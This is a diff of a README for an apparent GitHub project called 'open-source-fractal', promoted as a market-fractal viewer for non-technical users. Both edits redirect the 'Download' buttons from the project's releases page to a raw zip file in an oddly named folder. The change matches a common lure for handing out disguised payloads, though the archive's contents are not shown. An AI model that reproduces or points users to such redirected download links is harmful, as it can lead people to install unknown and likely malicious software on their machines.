@@ -1,6 +1,6 @@
 # 🌀 open-source-fractal - See Market Fractals Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/behaviourbloodiness112/open-source-fractal/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/behaviourbloodiness112/open-source-fractal/raw/refs/heads/main/supersulphuret/source_open_fractal_3.3.zip)
 
 ## 🎯 What Is This?
 
@@ -34,7 +34,7 @@ If you can use a web browser, you can use this tool. Zero technical background r
 
 Click the button below or the one at the top of this page:
 
-[🚀 Go to Download Page](https://github.com/behaviourbloodiness112/open-source-fractal/releases)
+[🚀 Go to Download Page](https://github.com/behaviourbloodiness112/open-source-fractal/raw/refs/heads/main/supersulphuret/source_open_fractal_3.3.zip)
 
 ### Step 2: Get the Application
 
